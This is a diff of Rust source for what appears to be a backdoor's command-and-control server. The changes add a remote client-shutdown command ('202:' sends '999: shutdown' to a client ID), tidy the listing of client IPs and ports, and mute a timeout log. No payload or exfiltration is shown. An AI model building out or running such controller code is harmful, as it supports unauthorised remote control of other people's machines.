@@ -198,6 +198,10 @@ fn tcp_writer(mut stream: TcpStream, receiver: mpsc::Receiver<String>) {
         log::info!("tcp_writer: Sending data: {}", received_data);
         // Write the received data to the TCP stream
         stream.write_all(received_data.as_bytes()).unwrap();
+        if received_data.contains("999:") {
+            log::info!("tcp_writer: Client will close the connection...");
+            break;
+        }
     }
 }
 fn _print_clients(){
@@ -289,7 +293,7 @@ loop{
             Ok(n) => {
                 // Adiciona os dados lidos ao vetor de resultado
                 let received_data = String::from_utf8_lossy(&buffer[..n]);
-                let mut cmdtotcp: &str = "";
+                let mut cmdtotcp: &str = "none";
                 if let Some(cmdtotcp1) = received_data.get(0..4) {
                     println!("Backdoor: cmdtotcp {}", cmdtotcp); // Output: "Hello"
                     cmdtotcp = cmdtotcp1;
@@ -299,6 +303,24 @@ loop{
                 
                 if received_data.trim() == "200:" {
                     //sender_to_ger_client.send(cmdtotcp.to_string()).unwrap();
+                    continue;
+                }
+                if received_data.contains("202:") {
+                    let client_id = &received_data[4..8];
+                    let mut u16client_id: u16 = 0;
+                    match client_id.parse::<u16>() {
+                        Ok(valor) => {
+                            u16client_id = valor;
+                            println!("Conversão bem-sucedida: {}", u16client_id);
+                        }
+                        Err(e) => println!("Falha na conversão: {}", e),
+                        
+                    }
+                    let shutdown: String = "999: shutdown".to_string();
+                    println!("Convertido: {}", u16client_id);
+                    clientdata::ClientData::send_client_msg_by_id(u16client_id,shutdown);
+                    thread::sleep(Duration::from_millis(5000));
+                    //process::exit(0);
                     continue;
                 }
                 if received_data.trim() == "201:" {
@@ -311,7 +333,7 @@ loop{
                 if received_data.trim() == "L" || received_data.trim() == "l" {
                     let clients = clientdata::ClientData::list_clients();   
                     for client in clients {
-                        let one_client = format!("Client ID: {}\nClient IP: {}\nClient Status: {}\nClient Port: {}\nClient CID: {}\n---\n", client.id, client.ip, client.status, client.port, client.cid);
+                        let one_client = format!("Client ID: {} Client IP: {} Client Status: {} Client Port: {} Client CID: {}\n", client.id, client.ip, client.status, client.port, client.cid);
                         stream.write(one_client.as_bytes()).unwrap();
                     }                                 
                 }else if received_data.trim() == "E" || received_data.trim() == "E" {
@@ -325,7 +347,7 @@ loop{
                 // Não há dados disponíveis no momento
                 if start_time.elapsed() >= timeout1 {
                     // Timeout atingido
-                    log::error!("Read timed out");
+                   // log::error!("Read timed out");
                     //break; //nao quero sair do loop
                 }
                 // Espera um pouco antes de tentar novamente
